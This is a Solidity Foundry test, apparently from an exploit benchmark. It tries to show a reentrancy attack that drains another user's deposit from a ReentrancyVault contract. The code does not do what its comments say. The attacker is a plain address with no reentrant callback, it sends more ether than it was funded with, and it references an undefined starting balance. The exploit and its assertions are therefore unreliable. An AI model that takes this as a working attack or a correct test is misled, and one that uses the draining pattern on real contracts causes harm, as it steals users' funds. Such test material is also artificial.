// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/af28df88-6c82-44e8-ab91-67390d040a9a_ReentrancyVault.sol";

contract ReentrancyVaultTest is BaseTestWithBalanceLog {
    address attacker = address(0xBAD);
    ReentrancyVault target;

    address user;
    // Add a new instance for the user
    function setUp() public override {
        target = new ReentrancyVault();
        
        vm.deal(attacker, 1 ether);
        
        /* Setup User */
        user = makeAddr("user");
        vm.deal(user, 2 ether); 
        // Ensure that the user has sufficient funds to exploit
    }

    function testExploit() public balanceLog {
        // Step 1: Call deposit() from an initial user account to deposit Ether into the contract
        vm.startPrank(user);
        target.deposit{value: 1 ether}();
        vm.stopPrank();

        (uint256 initialBalance, ) = target.balances(user);
        assertEq(initialBalance, 1 ether); // User should now have 1 Ether in the contract

        // Step 2: Call withdraw() with a higher amount than the user's balance and exploit reentrancy
        vm.startPrank(attacker);
        target.withdraw{value: 2 ether}(3 ether); // Exploit by sending more funds than the balance
        vm.stopPrank();

        (initialBalance, ) = target.balances(user);
        assertEq(initialBalance, 0 ether); // User's balance should be reduced to 0 due to reentrancy

        assertGt(attacker.balance, startingAttackerBalance); // Assert that attacker's balance has increased
    }
}